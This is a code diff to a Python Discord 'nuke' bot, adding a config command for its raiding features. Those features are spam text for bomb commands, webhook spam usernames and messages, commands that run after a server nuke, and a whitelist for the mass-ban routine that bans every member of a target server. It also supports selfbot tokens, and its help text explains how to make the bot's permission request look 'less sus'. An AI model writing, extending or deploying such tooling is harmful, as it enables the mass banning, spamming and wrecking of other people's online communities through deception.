+                ctx.message.content = settings['command_prefix'] + command
                 await client.process_commands(ctx.message)
-                # if not server_changes and command.lower().startswith(('si', 'sn', 'servericon', 'changeservericon', 'servername', 'changeservername')):
-                #     pass
             except:
-                consoleLog(f'{Fore.RED}Command {Fore.YELLOW}"{command_prefix}{command}" {Fore.RED}has failed to execute.', True)
+                consoleLog(f'{Fore.RED}Command {Fore.YELLOW}"{settings["command_prefix"]}{command}" {Fore.RED}has failed to execute.', True)
                 pass
 
         consoleLog(f'{Fore.GREEN}After commands completed.')
@@ -1441,10 +1504,646 @@ async def banAll(ctx):
     payload = {'delete_message_days':'0', 'reason': ''}
     consoleLog(f'{Fore.YELLOW}Starting ban all...', True)
     for member_ in selected_server.members:
+        if f'{member_.name}#{member_.discriminator}' in settings['ban_whitelist'] or str(member_.id) in settings['ban_whitelist']:
+            consoleLog(f'Ban skipped for {member_.name}#{member_.discriminator} -> in ban whitelist')
+            continue
         q.put((requests.put, f'https://discord.com/api/v8/guilds/{selected_server.id}/bans/{member_.id}', headers, payload))
         
     q.join()
     consoleLog(f'{Fore.GREEN}Ban all completed.', True)
+
+## Configuration command ##
+@commands.check(checkPerm)
+@client.command(name='config')
+async def config(ctx, command=None, *, args=None):
+    global settings, settings_copy
+
+    async def embed_list(n, title, array):
+        if not n.isdigit() or (n := int(n) - 1) < 0:
+            await log(ctx, 'Bad page number.')
+            return
+
+        names = ''
+
+        item_length = len(array)
+        if item_length == 0:
+            return await ctx.send(f'{title} count: 0')
+        init_item = n * per_page
+        final_item = init_item + per_page
+        if init_item > item_length - per_page:
+            if init_item > item_length:
+                await ctx.send('Invalid page number.')
+                return
+            final_item = init_item + (item_length % per_page)
+        else:
+            final_item = init_item + per_page
+
+        for i in range(init_item, final_item, 1):
+            item = array[i]
+            if len(item) > 17:
+                item = item[:17] + '...'
+            names += f'{str(i+1)}) {item}\n'
+
+        theColor = randint(0, 0xFFFFFF)
+        embed = discord.Embed(
+            title = title,
+            description = f'Total count: {str(item_length)}; color: #{hex(theColor)[2:].zfill(6)}',
+            color = theColor
+        )
+        embed.add_field(name='Items', value=names, inline=True)
+        embed.set_footer(text=f'{n+1}/{str(ceil(item_length / per_page))}\n' + 
+                        ('Config is saved' if configIsSaved() else '(*)Config is not saved'))   
+
+        await ctx.send(embed=embed)
+
+    if command is None:
+        status_list = []
+        features_list = []
+        temp = settings.copy()
+
+        features_list.append('bomb_messages')
+        if temp['bomb_messages']['random'] is None or len(temp['bomb_messages']['fixed']) == 0:
+            status_list.append(':x:')
+        else:
+            status_list.append(':white_check_mark:')
+        features_list.append('webhook_spam')
+        if len(temp['webhook_spam']['usernames']) == 0 or len(temp['webhook_spam']['pfp_urls']) == 0 or len(temp['webhook_spam']['contents']) == 0:
+            status_list.append(':x:')
+        else:
+            status_list.append(':white_check_mark:')
+
+        del temp['bomb_messages']
+        del temp['webhook_spam']
+        for feature in temp:
+            features_list.append(feature)
+            if settings[feature] is None or (type(settings[feature]).__name__ == 'list' and len(settings[feature]) == 0):
+                status_list.append(':x:')
+            else:
+                status_list.append(':white_check_mark:')
+
+        theColor = randint(0, 0xFFFFFF)
+        embed = discord.Embed(
+            title = 'Nuking features',
+            description = f':white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
+            color = theColor
+        )
+        embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
+        embed.add_field(name='Features', value='\n'.join(features_list), inline=True)
+        embed.add_field(name='Usage', value=f'Use `{settings["command_prefix"]}config <feature>` to get more information about how to config that feature.\n\n`{settings["command_prefix"]}config save <file name>` to save the current config. If you save the config as `default.json` the bot next time will directly start with whatever is in that `.json` file.', inline=False)
+
+        embed.set_footer(text='Config is saved' if configIsSaved() else '(*)Config is not saved')
+        await ctx.send(embed=embed)
+        return
+
+    command = command.lower()
+
+    #################
+    #  permissions  #
+    #################
+    if command == 'permissions' or command == 'permission' or command == 'perms' or command == 'perm':
+        if args is None:
+            status_list = []
+            features_list = []
+
+            features_list.append('permissions')
+            if len(settings['permissions']) == 0:
+                status_list.append(':x:')
+            else:
+                status_list.append(':white_check_mark:')
+
+            theColor = randint(0, 0xFFFFFF)
+            embed = discord.Embed(
+                title = 'Permissions list',
+                description = f'Permissions for using the bot are given to the users.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
+                color = theColor
+            )
+            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
+            embed.add_field(name='Features', value='\n'.join(features_list), inline=True)
+            embed.add_field(name='Usage', value=f'`permissions add <userTag or userID> [userTag or userID] [user...` - grant permissions to the given user(s)\n\n`permissions remove <line number> [line number] [line...` - remove line(s) from the list\n\n`permissions list [page number]` - list all users that are in the permission list', inline=False)
+
+            embed.set_footer(text=('Config is saved' if configIsSaved() else '(*)Config is not saved'))
+
+            await ctx.send(embed=embed)
+
+        else:
+            args = args.split()
+            def alreadyExisted(checkingID):
+                for userID_index in range(len(settings['permissions'])):
+                    if settings['permissions'][userID_index] == checkingID:
+                        return True, userID_index
+                return False, None
+
+            if args[0] == 'add':
+                del args[0]
+                for userID in args:
+                    existed, checkedID_index = alreadyExisted(userID)
+                    if existed:
+                        await log(ctx, f'Failed to add `{settings["permissions"][checkedID_index]}`. Already existed the permission list.')
+                        continue
+                    else:
+                        settings['permissions'].append(userID)
+
+            elif args[0] == 'remove':
+                if len(args) > 1:
+                    del args[0]
+                    offset = 1
+                    initial_length = len(settings['permissions'])
+                    for item in args:
+                        if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
+                            del settings['permissions'][item - offset]
+                            offset += 1
+                        else:
+                            await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')
+
+                    await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
+                else:
+                    await log(ctx, f'Enter line(s) to remove from bomb_messages fixed list.')
+            
+            elif args[0] == 'list':
+                await embed_list(args[1] if len(args) > 1 else '1', 'permission list', settings['permissions'])
+
+            else:
+                await log(ctx, f'Unknown operation: `{args[1]}`')
+
+    #################
+    # bomb_messages #
+    #################
+    elif command == 'bomb_messages' or command == 'bomb_message' or command == 'bomb':
+        if args is None:
+            status_list = []
+            features_list = []
+            
+            features_list.append('random')
+            if settings['bomb_messages']['random'] is None:
+                status_list.append(':x:')
+            else:
+                status_list.append(':white_check_mark:')
+
+            features_list.append('fixed')
+            if len(settings['bomb_messages']['fixed']) == 0:
+                status_list.append(':x:')
+            else:
+                status_list.append(':white_check_mark:')
+
+            theColor = randint(0, 0xFFFFFF)
+            embed = discord.Embed(
+                title = 'bomb_messages',
+                description = f'Config for all the bomb commands.\nWhen you run bomb commands like `{settings["command_prefix"]}channelbomb 100 fixed` the fixed is the type of word list you are going to use. In this case the word list is going to randomly pick texts from the "fixed" list.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
+                color = theColor
+            )
+            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
+            embed.add_field(name='Types', value='\n'.join(features_list), inline=True)
+            embed.add_field(name='Usage', value=f'`bomb_messages fixed add <command>` - add contents to the back of the list\n\n`bomb_messages fixed remove <line number> [line number] [line...` - remove line(s) from the list\n\n`bomb_messages fixed list [page number]` - list contents that are in the content list\n\n`bomb_messages random <character length>` - sets character length for bomb commands like `{settings["command_prefix"]}kaboom 100 b64`(b64 = base64) ', inline=False)
+
+            embed.set_footer(text='Config is saved' if configIsSaved() else '(*)Config is not saved')
+            await ctx.send(embed=embed)
+
+        else:
+            args = args.split()
+            if args[0].lower() == 'random':
+                if len(args) > 1 and args[1].isdigit() and (1 <= (length := int(args[1])) <= 1024):
+                    settings['bomb_messages']['random'] = length
+                    await log(ctx, f'Random-message length has been set to `{str(length)}`.')
+                else:
+                    await log(ctx, 'Please enter a positive integer that is between 1 and 1024.')
+
+            elif args[0].lower() == 'fixed':
+                if args[1] == 'add':
+                    if len(args) > 2 and (1 <= len(text := ' '.join(args[2:])) <= 100):
+                        settings['bomb_messages']['fixed'].append(text)
+                        await log(ctx, f'Text added. Character length: `{str(len(text))}`.')
+                    else: 
+                        await log(ctx, f'Please enter something that has 1 to 100 characters.')
+
+                elif args[1] == 'remove':
+                    if len(args) > 2:
+                        del args[0], args[0]
+                        offset = 1
+                        initial_length = len(settings['bomb_messages']['fixed'])
+                        for item in args:
+                            if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
+                                del settings['bomb_messages']['fixed'][item - offset]
+                                offset += 1
+                            else:
+                                await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')
+
+                        await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
+                    else:
+                        await log(ctx, f'Enter line(s) to remove from bomb_messages fixed list.')
+                
+                elif args[1] == 'list':
+                    await embed_list(args[2] if len(args) > 2 else '1', 'bomb_messages fixed list', settings['bomb_messages']['fixed'])
+
+                else:
+                    await log(ctx, f'Unknown operation: `{args[1]}`')
+
+            else:
+                await log(ctx, f'Unable to find {args[0]} config.')
+
+
+    ################
+    #   webhook    #
+    ################
+    elif command == 'webhook_spam':
+        if args is None:
+            status_list = []
+            features_list = []
+
+            for feature in settings['webhook_spam']:
+                features_list.append(feature)
+                if len(settings['webhook_spam'][feature]) == 0:
+                    status_list.append(':x:')
+                else:
+                    status_list.append(':white_check_mark:')
+
+            theColor = randint(0, 0xFFFFFF)
+            embed = discord.Embed(
+                title = 'webhook_spam',
+                description = f'Using webhook to spam messages. To send a message from discord webhook it requires 3 items: usernames, profile picture, and contents. For profile picture you can only put an image URL or put `none` for no pfp.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
+                color = theColor
+            )
+            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
+            embed.add_field(name='Types', value='\n'.join(features_list), inline=True)
+            embed.add_field(name='Usage', value=f'`webhook_spam <type> add <command>` - add contents to the back of the list\n\n`webhook_spam <type> remove <line number> [line number] [line...` - remove line(s) from the list\n\n`webhook_spam <type> list [page number]` - list contents that are in the content list', inline=False)
+
+            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')
+
+            await ctx.send(embed=embed)
+
+        else:
+            args = args.split()
+            if args[0] == 'usernames' or args[0] == 'username':
+                if args[1] == 'add':
+                    if len(args) > 2 and (0 < len(text := ' '.join(args[2:])) <= 32):
+                        settings['webhook_spam']['usernames'].append(text)
+                        await log(ctx, f'Text added. Character length: `{str(len(text))}`.')
+                    else: 
+                        await log(ctx, f'Please enter something that has 1 to 32 characters.')
+
+                elif args[1] == 'remove':
+                    if len(args) > 2:
+                        del args[0], args[0]
+                        offset = 1
+                        initial_length = len(settings['webhook_spam']['usernames'])
+                        for item in args:
+                            if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
+                                del settings['webhook_spam']['usernames'][item - offset]
+                                offset += 1
+                            else:
+                                await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')
+
+                        await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
+                    else:
+                        await log(ctx, f'Enter line(s) to remove from usernames.')
+                
+                elif args[1] == 'list':
+                    await embed_list(args[2] if len(args) > 2 else '1', 'webhook_spam usernames list', settings['webhook_spam']['usernames'])
+
+                else:
+                    await log(ctx, f'Unknown operation: `{args[1]}`')
+
+            elif args[0] == 'pfp_urls' or args[0] == 'pfp_url' or args[0] == 'pfp':
+                if args[1] == 'add':
+                    if len(args) > 1 and args[2].lower() == 'none':
+                        settings['webhook_spam']['pfp_urls'].append(None)
+                        await log(ctx, f'No pfp item has been added')
+                    elif len(args) > 1 and (text := ' '.join(args[1:]).startswith(('https://', 'http://'))):
+                        settings['webhook_spam']['pfp_urls'].append(text)
+                        await log(ctx, f'URL added.')
+                    else: 
+                        await log(ctx, f'Please enter an **image URL**. Note: the link must start with http(s) protocals. Or enter `none` for no pfp.')
+                
+                elif args[1] == 'remove':
+                    if len(args) > 2:
+                        del args[0], args[0]
+                        offset = 1
+                        initial_length = len(settings['webhook_spam']['pfp_urls'])
+                        for item in args:
+                            if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
+                                del settings['webhook_spam']['pfp_urls'][item - offset]
+                                offset += 1
+                            else:
+                                await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')
+
+                        await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
+                    else:
+                        await log(ctx, f'Enter line(s) to remove from pfp_urls.')
+                
+                elif args[1] == 'list':
+                    await embed_list(args[2] if len(args) > 2 else '1', 'webhook_spam pfp_urls list', settings['webhook_spam']['pfp_urls'])
+
+                else:
+                    await log(ctx, f'Unknown operation: `{args[1]}`')
+
+            elif args[0] == 'contents' or args[0] == 'content':
+                if args[1] == 'add':
+                    if len(args) > 1 and (0 < len(text := ' '.join(args[1:])) <= 2000):
+                        settings['webhook_spam']['contents'].append(text)
+                        await log(ctx, f'Text added. Character length: `{str(len(text))}`.')
+                    else: 
+                        await log(ctx, f'Please enter something that has 1 to 2000 characters.')
+
+                elif args[1] == 'remove':
+                    if len(args) > 2:
+                        del args[0], args[0]
+                        offset = 1
+                        initial_length = len(settings['webhook_spam']['contents'])
+                        for item in args:
+                            if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
+                                del settings['webhook_spam']['contents'][item - offset]
+                                offset += 1
+                            else:
+                                await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')
+
+                        await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
+                    else:
+                        await log(ctx, f'Enter line(s) to remove from contents.')
+                
+                elif args[1] == 'list':
+                    await embed_list(args[2] if len(args) > 2 else '1', 'webhook_spam contents list', settings['webhook_spam']['contents'])
+
+                else:
+                    await log(ctx, f'Unknown operation: `{args[1]}`')
+            else:
+                await log(ctx, f'Unknown type: `{args[0]}`')
+
+    elif command == 'after':
+        if args is None:
+            status_list = []
+            features_list = []
+            
+            features_list.append('after')
+            if len(settings['after']) == 0:
+                status_list.append(':x:')
+            else:
+                status_list.append(':white_check_mark:')
+
+            theColor = randint(0, 0xFFFFFF)
+            embed = discord.Embed(
+                title = 'After commands',
+                description = f'All the commands in this list will run after `{settings["command_prefix"]}nuke`. It can be disabled by adding "false" after the nuke command: `{settings["command_prefix"]}nuke false`.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
+                color = theColor
+            )
+            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
+            embed.add_field(name='Features', value='\n'.join(features_list), inline=True)
+            embed.add_field(name='Usage', value=f'`after add <command>` - add command to the back of the command list\n\n`after remove <line number> [line number] [line...` - remove line(s) in the command list\n\n`after insert <line number> <command>` - insert command after the given line. Note: use `insert 0 <command>` to insert the command to the first line\n\n`after list [page number]` - list commands that are in the command list', inline=False)
+
+            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')
+            await ctx.send(embed=embed)
+
+        else: 
+            args = args.split()
+            if args[0] == 'add':
+                if len(args) > 1:
+                    text = ' '.join(args[1:])
+                    settings['after'].append(text)
+                    await log(ctx, f'Command added. Character length: `{str(len(text))}`.')
+                else: 
+                    await log(ctx, f'Please enter the command you want to add after line `{len(settings["after"])}`.')
+            
+            elif args[0] == 'remove':
+                if len(args) > 1:
+                    del args[0]
+                    offset = 1
+                    initial_length = len(settings['after'])
+                    for item in args:
+                        if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
+                            del settings['after'][item - offset]
+                            offset += 1
+                        else:
+                            await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')
+
+                    await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
+                else:
+                    await log(ctx, f'Enter the line(s) that you want to remove from after commands.')
+
+            elif args[0] == 'insert':
+                if len(args) > 2 and args[1].isdigit():
+                    if not (0 <= (index := int(args[1])) <= len(settings['after'])) or len(settings['after']) == 0:
+                        await log(ctx, f'Line `{args[1]}` doesn\'t exist.')
+                        return
+
+                    settings['after'].insert(index, ' '.join(args[2:]))
+                    await log(ctx, f'Added command after line `{args[1]}`.')
+                else:
+                    await log(ctx, 'Insert usage: `after insert <after line #> <command...>`')
+            
+            elif args[0] == 'list':
+                await embed_list(args[1] if len(args) > 1 else '1', 'after command(s) list', settings['after'])
+
+            else:
+                await log(ctx, f'Unknown operation: `{args[0]}`')
+
+    elif command == 'bot_status':
+        if args is None:
+            theColor = randint(0, 0xFFFFFF)
+            embed = discord.Embed(
+                title = 'bot_status',
+                description = f'Whenever the bot boot up the status will be set to a given status.\n\ncolor: #{hex(theColor)[2:].zfill(6)}',
+                color = theColor
+            )
+            embed.add_field(name='Status', value=f'{settings["bot_status"]}', inline=True)
+            embed.add_field(name='Features', value='bot_status', inline=True)
+            embed.add_field(name='Usage', value=f'`bot_status <on start status>` - set the on start status. Available on start status are `online`, `offline`, `idle`, and `dnd` or `do_not_disturb`. By default it is set to `offline`.', inline=False)
+
+            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')
+            await ctx.send(embed=embed)
+        else:
+            if (args := args.lower()) in ['online', 'offline', 'idle', 'dnd', 'do_not_disturb']:
+                settings['bot_status'] = args
+                await log(ctx, 'On bot start status has been set to `{args}`.')
+            else:
+                await log(ctx, 'Available on start status are `online`, `offline`, `idle`, and `dnd` or `do_not_disturb`.')
+
+    elif command == 'bot_permission':
+        if args is None:
+            theColor = randint(0, 0xFFFFFF)
+            embed = discord.Embed(
+                title = 'bot_permission',
+                description = f'If you are using a selfbot, then you don\'t have to do anything to this section. This bot_permission section is for normal bot invite URL that will ask the person inviting it for permission/roles (ex. admin, server manager). The default is set to 2146958847, which asks for all permissions. If you want to make the bot less sus, you can remove the permissions that are not needed.\n\ncolor: #{hex(theColor)[2:].zfill(6)}',
+                color = theColor
+            )
+            embed.add_field(name='Value', value=f'{settings["bot_permission"]}', inline=True)
+            embed.add_field(name='Features', value='bot_permission', inline=True)
+            embed.add_field(name='Usage', value=f'`bot_permission <value>` - set permissions value to the given number. Use this [permission calculator](https://wizbot.cc/permissions-calculator/?v=0) to help you calculate the values. Note: if you are going to use that calculator all you need is to copy the number that is display at the top, and then use this command.', inline=False)
+
+            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')
+            await ctx.send(embed=embed)
+        else:
+            if args.isdigit() and 0 <= int(args) <= 2146958847:
+                settings['bot_permission'] = args
+                await log(ctx, 'Bot permission has been set to `{args}`.')
+            else:
+                await log(ctx, 'Please enter a value between 0 and 2146958847.')
+
+
+    elif command == 'save':
+        def check(message: discord.Message):
+            return message.author.id == ctx.message.author.id
+
+        if args is None:
+            await log(ctx, f'You need to name the file. Use `{settings["command_prefix"]}save <file name>`.')
+            return
+
+        parent_dir = os.path.join(Path().absolute().__str__(), 'data')
+        config_path = os.path.join(parent_dir, args.translate(bad_filename_map))
+
+        if os.path.isfile(config_path):
+            await log(ctx, f'Configuration file named {args} already exist. Do you want to overwrite it? [Y/n]')
+            while True:
+                try:
+                    msg = (await client.wait_for('message', check=check, timeout=10)).content.lower()
+                    if msg == 'y' or msg == 'yes':
+                        with open(config_path, 'w') as f:
+                            f.write(json.dumps(settings))
+                            break
+                    elif msg == 'n' or msg == 'no':
+                        await log(ctx, f'Saving cancelled.')
+                        return
+                    
+                    await log(ctx, f'Yes or no.')
+                except (asyncio.exceptions.TimeoutError, discord.ext.commands.errors.CommandInvokeError):
+                    await log(ctx, "Took too long to answer.")
+                    return
+        else:
+            if not os.path.isdir(parent_dir):
+                os.mkdir(parent_dir)
+            with open(config_path, 'w+') as f:
+                f.write(json.dumps(settings))
+
+        global settings_copy
+        settings_copy = deepcopy(settings)
+        await log(ctx, 'Finished saving.')
+
+    elif command == 'verbose':
+        if args is None:
+            status_list = []
+            features_list = []
+
+            # hard coding this because I don't think there's a better way to set the values.
+            
+            features_list.append('Log response from requests')
+            if want_log_request:
+                status_list.append(':white_check_mark:')
+            else:
+                status_list.append(':x:')
+
+            features_list.append('Log messages in console')
+            if want_log_console:
+                status_list.append(':white_check_mark:')
+            else:
+                status_list.append(':x:')
+
+            features_list.append('Log messages in discord chat')
+            if want_log_message:
+                status_list.append(':white_check_mark:')
+            else:
+                status_list.append(':x:')
+
+            features_list.append('Log any errors')
+            if want_log_errors:
+                status_list.append(':white_check_mark:')
+            else:
+                status_list.append(':x:')
+
+            theColor = randint(0, 0xFFFFFF)
+            embed = discord.Embed(
+                title = 'verbose',
+                description = f'Verbose is the log level. Meaning that if you don\'t want any one of the logs to spam rate limiting errors or whatever errors that the bot is going to throw at you, you can disable them to prevent some lag.\n\nCurrent verbose value: `{str(settings["verbose"])}`\n:white_check_mark: = Enabled\n:x: = Disabled\ncolor: #{hex(theColor)[2:].zfill(6)}',
+                color = theColor
+            )
+
+            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
+            embed.add_field(name='Logs', value='\n'.join(features_list), inline=True)
+            embed.add_field(name='Usage', value=f'`verbose <value>` - enable and disable the logs. Subtracting the values below from the current verbose to disable the log(s) you want, and adding the values will enable them. For example if I want to disable "Log any error" I will subtract 8 from 15 to get 7 and use 7 as the new verbose value to set, if I want to disable more like "Log response from request" I will substract 1 from 7 to get 6. To enable them back just add 8 and 1 to the current verbose value.\n\n`1` - Log response from requests\n`2` - Log messages in console\n`4`- Log messages in discord chat\n`8` - Log any errors.', inline=False)
+
+            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')
+            await ctx.send(embed=embed)
+        else:
+            if args.isdigit() and 0 <= (args := int(args)) <= 15:
+                settings['verbose'] = args
+                updateVerbose()
+                await log(ctx, 'On bot start status has been set to `{args}`.')
+            else:
+                await log(ctx, 'You can only enter a positve integer between or on 0 and 15.')
+
+    elif command == 'ban_whitelist':
+        if args is None:
+            status_list = []
+            features_list = []
+            
+            features_list.append('ban_whitelist')
+            if len(settings['ban_whitelist']) == 0:
+                status_list.append(':x:')
+            else:
+                status_list.append(':white_check_mark:')
+
+            theColor = randint(0, 0xFFFFFF)
+            embed = discord.Embed(
+                title = 'Ban whitelist',
+                description = f'Ban whitelist is used for telling `{settings["command_prefix"]}banAll` and `{settings["command_prefix"]}nuke` to not ban the users in the list. You can put discord tag or discord ID in the list, but it is recommended to use discord ID because in the pass there has some uncheckable discord tags.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
+                color = theColor
+            )
+            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
+            embed.add_field(name='Features', value='\n'.join(features_list), inline=True)
+            embed.add_field(name='Usage', value=f'`ban_whitelist add <command>` - add user to the back of the command list\n\n`ban_whitelist remove <line number> [line number] [line...` - remove line(s) in the ban whitelist\n\n`ban_whitelist list [page number]` - list users that are in the ban whitelist', inline=False)
+
+            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')
+            await ctx.send(embed=embed)
+
+        else:
+            args = args.split()
+            if args[0] == 'add':
+                if len(args) > 1:
+                    text = ' '.join(args[1:])
+                    settings['ban_whitelist'].append(text)
+                    await log(ctx, f'User added. Character length: `{str(len(text))}`.')
+                else: 
+                    await log(ctx, f'Please enter the userID or userTag that you want to add after line `{str(len(settings["after"]))}`.')
+            
+            elif args[0] == 'remove':
+                if len(args) > 1:
+                    del args[0]
+                    offset = 1
+                    initial_length = len(settings['ban_whitelist'])
+                    for item in args:
+                        if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
+                            del settings['ban_whitelist'][item - offset]
+                            offset += 1
+                        else:
+                            await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')
+
+                    await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
+                else:
+                    await log(ctx, f'Enter line(s) to remove from usernames.')
+            
+            elif args[0] == 'list':
+                await embed_list(args[1] if len(args) > 1 else '1', 'ban whitelist', settings['ban_whitelist'])
+
+            else:
+                await log(ctx, f'Unknown operation: `{args[0]}`')
+
+
+    elif command == 'proxies':
+        await log(ctx, 'This feature has been disable for now due to unhandled slow/bad proxies.')
+
+    elif command == 'prefix' or command == 'command_prefix':
+        if args is None:
+            await log(ctx, f'Use `` {command_prefix}config command_prefix <command_prefix> ``')
+        else:
+            settings['command_prefix'] = client.command_prefix = args
+
+            await log(ctx, 'Command prefix changed.')
+    elif command == 'token':
+        if args is None:
+            await log(ctx, 'Usage: `token <new token>` - new token for this config. Restarting the bot will be required. And remember to save the config before restarting.')
+        else:
+            settings['token'] = args
+            await log(ctx, 'New token has been set.')
+    else:
+        await log(ctx, f'Unable to find the config. `{command}`')
+
+
 
 ## Additional functions ##
 @commands.check(checkPerm)
@@ -1482,25 +2181,25 @@ async def checkRolePermissions(ctx, name, n='1'):
             master_list += ':x: '
         master_list += item.replace('_', ' ').capitalize() + '\n'
     
-    if not isDM(ctx) and ctx.guild.id == selected_server.id and 1 << 11 & selected_server.me.guild_permissions.value == 0:
-        consoleLog('\n%s*Check role permissions*\n%sPermission value -> %s%d : 2147483647\n%s %s%d/%d' % (Fore.CYAN, Fore.RESET, Fore.YELLOW, value, master_list.replace(':white_check_mark:', f'{Fore.GREEN}+').replace(':x:', f'{Fore.RED}-'), Fore.YELLOW, n+1, ceil(item_length / per_page)), True)
-    else:
-        try:
-            embed = discord.Embed(
-                title = 'User permissions',
-                description = f'Encoded value: {str(value)} : 2147483647',
-                color = discord.Color.red()
-            )
+    # if not isDM(ctx) and ctx.guild.id == selected_server.id and 1 << 11 & selected_server.me.guild_permissions.value == 0:
+    #     consoleLog('\n%s*Check role permissions*\n%sPermission value -> %s%d : 2147483647\n%s %s%d/%d' % (Fore.CYAN, Fore.RESET, Fore.YELLOW, value, master_list.replace(':white_check_mark:', f'{Fore.GREEN}+').replace(':x:', f'{Fore.RED}-'), Fore.YELLOW, n+1, ceil(item_length / per_page)), True)
+    # else:
+    try:
+        embed = discord.Embed(
+            title = 'User permissions',
+            description = f'Encoded value: {str(value)} : 2147483647',
+            color = discord.Color.red()
+        )
 
-            embed.add_field(name='Permissions', value=master_list, inline=True)
-            embed.set_footer(text=f'{str(n+1)}/{str(ceil(item_length / per_page))}')
-            await ctx.send(embed=embed)
-        except:
-            await ctx.send('```diff\n%s %d/%d```' % (master_list.replace(':white_check_mark:', '+').replace(':x:', '-'), n+1, ceil(item_length / per_page)))
+        embed.add_field(name='Permissions', value=master_list, inline=True)
+        embed.set_footer(text=f'{str(n+1)}/{str(ceil(item_length / per_page))}')
+        await ctx.send(embed=embed)
+    except:
+        await ctx.send('```diff\n%s %d/%d```' % (master_list.replace(':white_check_mark:', '+').replace(':x:', '-'), n+1, ceil(item_length / per_page)))
 
 @commands.check(checkPerm)
-@client.command(name='si', aliases=['serverIcon', 'changeServerIcon'])
-async def si(ctx, path=None):
+@client.command(name='serverIcon', aliases=['si', 'changeServerIcon'])
+async def serverIcon(ctx, path=None):
     if not await hasTarget(ctx):
         return
 
@@ -1540,8 +2239,8 @@ async def si(ctx, path=None):
         await log(ctx, f'Character\'s bytes: {unicode_number}{unicode_string}')
 
 @commands.check(checkPerm)
-@client.command(name='sn', aliases=['serverName', 'changeServerName'])
-async def sn(ctx, *, name):
+@client.command(name='serverName', aliases=['sn', 'changeServerName'])
+async def serverName(ctx, *, name):
     if not await hasTarget(ctx):
         return
 
@@ -1555,8 +2254,8 @@ async def sn(ctx, *, name):
         raise
 
 @commands.check(checkPerm)
-@client.command(name='clear', aliases=['purge'])
-async def clear(ctx, n=None):
+@client.command(name='purge', aliases=['clear'])
+async def purge(ctx, n=None):
     if not await hasTarget(ctx):
         return
 
@@ -1578,8 +2277,6 @@ async def clear(ctx, n=None):
                 consoleLog(f'ratelimiting reached. Purging delay has been set to -> {str(delay_time)} seconds')
             else:
                 break
-
-
 
 @commands.check(checkPerm)
 @client.command(name='leave')
@@ -1640,7 +2337,7 @@ async def changeStatus(ctx, status):
 @client.command(name='link', aliases=['l'])
 async def link(ctx):
     if not is_selfbot:
-        await ctx.channel.send(f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={bot_permission}&scope=bot')
+        await ctx.channel.send(f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={settings["bot_permission"]}&scope=bot')
     else:
         await log(ctx, f'This account is not a bot :). You can join servers with invite codes.')
 
@@ -1650,8 +2347,6 @@ async def autoNick(ctx):
     if not await hasTarget(ctx):
         return
 
-    # global headers
-
     global auto_nick
     if not auto_nick:
         consoleLog(f'{Fore.CYAN}Auto nickname is on.', True)
@@ -1660,7 +2355,7 @@ async def autoNick(ctx):
             # payload = {'nick': ''.join(choice(alphanum) for _ in range(10))}
             # q.put((requests.patch, f'https://discord.com/api/v8/guilds/{selected_server.id}/members/%40me/nick', headers, payload))
             
-            await selected_server.me.edit(nick=''.join(choice(alphanum) for _ in range(10)))
+            await selected_server.me.edit(nick=''.join(choices(alphanum, k=10)))
     else:
         consoleLog(f'{Fore.BLUE}Auto nickname is off.', True)
         auto_nick = False
@@ -1682,10 +2377,9 @@ async def autoStatus(ctx):
         consoleLog(f'{Fore.BLUE}Auto status is off.', True)
         auto_status = False
 
-
 @commands.check(checkPerm)
 @client.command(name='off', aliases=['logout', 'logoff', 'shutdown', 'stop'])
-async def off(ctx=None):
+async def off(ctx):
     ### Discord takes too long to realize if the bot is offline people might get confused about the not turning off the bot vs discord takes time to update
     await changeStatus(None, 'offline')
     await client.logout()
@@ -1706,12 +2400,33 @@ def silence_event_loop_closed(func):
     return wrapper
